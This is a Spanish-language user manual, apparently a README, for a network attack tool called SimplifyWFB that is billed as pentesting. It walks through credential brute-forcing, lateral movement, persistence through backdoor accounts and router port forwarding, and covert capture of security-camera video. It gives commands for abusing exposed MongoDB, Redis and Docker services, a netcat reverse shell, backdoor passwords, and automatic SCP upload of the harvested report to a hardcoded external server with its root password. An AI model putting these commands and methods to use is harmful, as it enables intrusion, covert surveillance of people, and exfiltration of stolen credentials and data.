# 📖 MANUAL COMPLETO PARA DUMMIES - SimplifyWFB

## 🎯 ¿QUÉ ES ESTE SCRIPT?

SimplifyWFB es una herramienta profesional de pentesting que **analiza redes de computadoras** para encontrar **vulnerabilidades de seguridad**. Es como un "detective digital" que busca puertas abiertas en sistemas de red.

---

## 🔍 ¿QUÉ HACE EXACTAMENTE?

### **FASE 1: RECONOCIMIENTO** 🔎
**¿Qué hace?** Explora la red como un explorador
- **Descubre computadoras** conectadas a la red
- **Identifica qué servicios** están ejecutándose (como puertas abiertas)
- **Mapea la red** para entender cómo están conectados los dispositivos

**¿Qué obtienes?** Una lista de todas las computadoras y servicios encontrados

### **FASE 2: RECOLECCIÓN DE CREDENCIALES** 🔑
**¿Qué hace?** Intenta "adivinar" contraseñas
- **Prueba contraseñas comunes** como "admin", "password", "123456"
- **Usa listas de contraseñas** conocidas por ser débiles
- **Busca credenciales** en archivos del sistema

**¿Qué obtienes?** Usuarios y contraseñas que funcionan para acceder a sistemas

### **FASE 3: MOVIMIENTO LATERAL** 🚶‍♂️
**¿Qué hace?** Usa las credenciales encontradas para acceder a más sistemas
- **Se conecta a computadoras** usando las credenciales válidas
- **Busca más sistemas** desde las computadoras comprometidas
- **Expande el acceso** a través de la red

**¿Qué obtienes?** Acceso a múltiples computadoras en la red

### **FASE 4: PERSISTENCIA** 🔒
**¿Qué hace?** Crea formas de mantener el acceso permanentemente
- **Crea usuarios nuevos** en los sistemas comprometidos
- **Instala "puertas traseras"** (backdoors) para acceso futuro
- **Accede al router** de la red para control total
- **Configura servicios** para acceso remoto desde internet
- **Detecta y accede a cámaras** de seguridad

**¿Qué obtienes?** Acceso permanente a la red desde cualquier lugar

### **FASE 5: VERIFICACIÓN** ✅
**¿Qué hace?** Confirma que todo funciona correctamente
- **Verifica usuarios** creados
- **Confirma backdoors** instalados
- **Prueba conexiones** remotas

**¿Qué obtienes?** Confirmación de que tienes acceso completo

---

## 📊 ¿QUÉ DATOS OBTIENES?

### **1. INFORMACIÓN DE RED** 🌐
```json
{
  "hosts_discovered": [
    {
      "ip": "192.168.1.100",
      "hostname": "PC-OFICINA",
      "services": ["SSH", "HTTP", "FTP"],
      "os": "Windows 10"
    }
  ]
}
```
**¿Qué significa?** Lista de todas las computadoras encontradas con sus detalles

### **2. CREDENCIALES ENCONTRADAS** 🔑
```json
{
  "credentials_found": [
    {
      "host": "192.168.1.100",
      "username": "admin",
      "password": "admin123",
      "service": "SSH"
    }
  ]
}
```
**¿Qué significa?** Usuarios y contraseñas que funcionan para acceder a sistemas

### **3. SISTEMAS COMPROMETIDOS** 💻
```json
{
  "compromised_systems": [
    {
      "host": "192.168.1.100",
      "access_method": "SSH",
      "privileges": "Administrator",
      "timestamp": "2024-01-15T10:30:00"
    }
  ]
}
```
**¿Qué significa?** Sistemas a los que tienes acceso completo

### **4. ACCESO AL ROUTER** 🌐
```json
{
  "router_access": [
    {
      "gateway": "192.168.1.1",
      "router_type": "TP-Link",
      "credentials": {
        "username": "admin",
        "password": "admin"
      },
      "port_forwarding": [
        {"external_port": 2222, "internal_port": 22}
      ]
    }
  ]
}
```
**¿Qué significa?** Control total del router de la red

### **5. SERVICIOS VULNERABLES** 🗄️
```json
{
  "vulnerable_services": [
    {
      "host": "192.168.1.100",
      "port": 27017,
      "service": "mongodb",
      "vulnerability": "No authentication required",
      "severity": "high",
      "backdoor_created": true
    },
    {
      "host": "192.168.1.101",
      "port": 6379,
      "service": "redis",
      "vulnerability": "No authentication required",
      "severity": "high",
      "backdoor_created": true
    }
  ]
}
```
**¿Qué significa?** Bases de datos y servicios expuestos sin protección

### **6. CÁMARAS DE SEGURIDAD** 📹
```json
{
  "cameras_accessed": [
    {
      "host": "192.168.1.50",
      "port": 80,
      "camera_type": "Hikvision",
      "credentials": {
        "username": "admin",
        "password": "12345"
      },
      "access_urls": {
        "web_interface": [
          "http://192.168.1.50:80",
          "http://192.168.1.50:80/viewer.html"
        ],
        "snapshot": "http://192.168.1.50:80/snapshot.cgi"
      },
      "screenshots": [
        "camera_192.168.1.50_screenshot_1.jpg",
        "camera_192.168.1.50_screenshot_2.jpg"
      ],
      "video_file": "camera_192.168.1.50_video_1640995200.mp4"
    }
  ]
}
```
**¿Qué significa?** Información completa de cámaras de seguridad accesibles

---

## 📹 ¿CÓMO ACCEDER A LAS CÁMARAS DE VIDEO?

### **MÉTODO 1: Navegador Web** 🌐
1. **Abre tu navegador** (Chrome, Firefox, etc.)
2. **Ve a la dirección**: `http://192.168.1.50:80`
3. **Ingresa las credenciales**:
   - Usuario: `admin`
   - Contraseña: `12345`
4. **¡Ya puedes ver la cámara!**

### **MÉTODO 2: URLs Directas** 🔗
- **Vista principal**: `http://192.168.1.50:80/viewer.html`
- **Solo imagen**: `http://192.168.1.50:80/snapshot.cgi`
- **Configuración**: `http://192.168.1.50:80/setup.html`

### **MÉTODO 3: Desde Internet** 🌍
Si configuraste port forwarding:
- **Acceso externo**: `http://TU_IP_PUBLICA:8080`
- **Usa las mismas credenciales** del reporte

### **MÉTODO 4: Software Especializado** 💻
- **VLC Media Player**: Abre red → `rtsp://admin:12345@192.168.1.50:554/stream1`
- **Software de cámaras**: Usa las credenciales del reporte

### **MÉTODO 5: Video Descargado** 📹
- **Archivo de video**: `camera_192.168.1.50_video_1640995200.mp4`
- **Duración**: 5 segundos o 100MB (lo que se cumpla primero)
- **Formato**: MP4
- **Ubicación**: Directorio `camera_videos_TIMESTAMP/`

---

## 🗄️ ¿CÓMO ACCEDER A SERVICIOS VULNERABLES?

### **MongoDB (Puerto 27017)** 🍃
```bash
# Conectar directamente
mongo mongodb://192.168.1.100:27017/admin

# Con credenciales de backdoor
mongo mongodb://backdoor_192_168_1_100:Mongo_100!@192.168.1.100:27017/admin
```

### **Redis (Puerto 6379)** 🔴
```bash
# Conectar directamente
redis-cli -h 192.168.1.101 -p 6379

# Ejecutar comandos
redis-cli -h 192.168.1.101 -p 6379 ping
redis-cli -h 192.168.1.101 -p 6379 keys *
```

### **Elasticsearch (Puerto 9200)** 🔍
```bash
# Verificar estado
curl -X GET http://192.168.1.102:9200/_cluster/health

# Buscar datos
curl -X POST http://192.168.1.102:9200/_search
```

### **Docker (Puerto 2375)** 🐳
```bash
# Ver información
curl -X GET http://192.168.1.103:2375/version

# Ejecutar contenedor
docker -H tcp://192.168.1.103:2375 run -it --rm alpine sh
```

### **Jenkins (Puerto 8080)** 🔧
```
# Acceder a la interfaz web
http://192.168.1.104:8080/

# Script console
http://192.168.1.104:8080/script
```

---

## 🚀 ¿CÓMO USAR EL SCRIPT?

### **PASO 1: Preparación** ⚙️
```bash
# Instalar dependencias
sudo apt install nmap hydra netcat openssh-client smbclient openssl openvpn nginx

# Instalar Python
pip install -r requirements.txt
```

### **PASO 2: Configuración** 🔧
Edita el archivo `config.json`:
```json
{
  "remote_access": {
    "external_ip": "TU_IP_PUBLICA",
    "external_port": 4444
  },
  "ssh_upload": {
    "host": "184.107.168.100",
    "port": 22,
    "username": "root",
    "password": "2vcA,%K6@8pJgq_b"
  }
}
```

### **PASO 3: Ejecución** ▶️
```bash
python3 simplifywfb.py
```

**Opciones disponibles:**
- **Opción 1**: Escaneo completo (mantiene acceso permanente)
- **Opción 2**: Pentest frío (limpia todo al final)

### **MODO FRÍO - OPPORTUNIDAD DE PRUEBA** 🧪
En el modo frío, después de completar todas las fases:
1. **Reporte generado** y enviado por FTP
2. **Oportunidad de prueba** de todos los backdoors creados
3. **Confirmación requerida** antes de limpiar
4. **Limpieza completa** si confirmas "sí"
5. **Sin rastros** si eliges limpiar

### **PASO 4: Revisar Resultados** 📊
El script genera un archivo `simplifywfb_report_TIMESTAMP.json` con todos los datos.

### **PASO 5: Envío Automático** 📤
- **Reporte enviado por SSH/SCP** automáticamente a `184.107.168.100:22`
- **Archivo local** se mantiene en el equipo
- **Acceso remoto** a los datos desde cualquier lugar

---

## 🔑 MÉTODOS DE ACCESO REMOTO

### **1. SSH (Terminal)** 💻
```bash
ssh svc_ssh@TU_IP_PUBLICA -p 2222
# Contraseña: SSH_P@ssw0rd_2024!
```

### **2. VPN (Conexión Segura)** 🔒
```bash
openvpn --config client.ovpn
```

### **3. Panel Web** 🌐
```
http://admin:Web_P@ssw0rd_2024!@TU_IP_PUBLICA:8080/admin
```

### **4. Reverse Shell** 🔄
```bash
nc -e /bin/bash TU_IP_PUBLICA 4444
```

---

## 📋 RESUMEN DE LO QUE OBTIENES

### **✅ INFORMACIÓN COMPLETA:**
- **Lista de computadoras** en la red
- **Credenciales válidas** para acceder a sistemas
- **Acceso completo** al router de la red
- **Control de cámaras** de seguridad con video descargado
- **Servicios vulnerables** (MongoDB, Redis, Docker, etc.)
- **Múltiples formas** de acceder remotamente

### **✅ ACCESO PERMANENTE:**
- **SSH** para terminal remoto
- **VPN** para conexión segura
- **Panel web** para administración
- **Backdoors** para acceso oculto
- **Servicios vulnerables** con backdoors específicos

### **✅ CONTROL TOTAL:**
- **Router configurado** para acceso externo
- **Port forwarding** habilitado
- **Usuarios persistentes** creados
- **Servicios** ejecutándose permanentemente

---

## ⚠️ IMPORTANTE

- **Solo usa en redes autorizadas** (que te pertenezcan o tengas permiso)
- **Es una herramienta profesional** de seguridad
- **Los datos obtenidos** son información real de sistemas
- **El acceso remoto** te permite controlar la red desde cualquier lugar

---

## 🆘 SOLUCIÓN DE PROBLEMAS

### **Problema**: No encuentra cámaras
**Solución**: Verifica que las cámaras estén en la misma red

### **Problema**: No puede acceder al router
**Solución**: Verifica que el router tenga interfaz web habilitada

### **Problema**: Credenciales no funcionan
**Solución**: El script probará automáticamente múltiples combinaciones

### **Problema**: No hay acceso remoto
**Solución**: Verifica que la IP pública esté configurada correctamente

---

## 📞 SOPORTE

Si tienes problemas:
1. **Revisa el archivo de reporte** JSON generado
2. **Verifica la configuración** en `config.json`
3. **Confirma que tienes permisos** en la red objetivo
4. **Revisa los logs** del script para errores específicos

---

**🎯 RECUERDA: Este es un manual para entender qué hace la herramienta. Siempre usa herramientas de seguridad de manera ética y legal.**
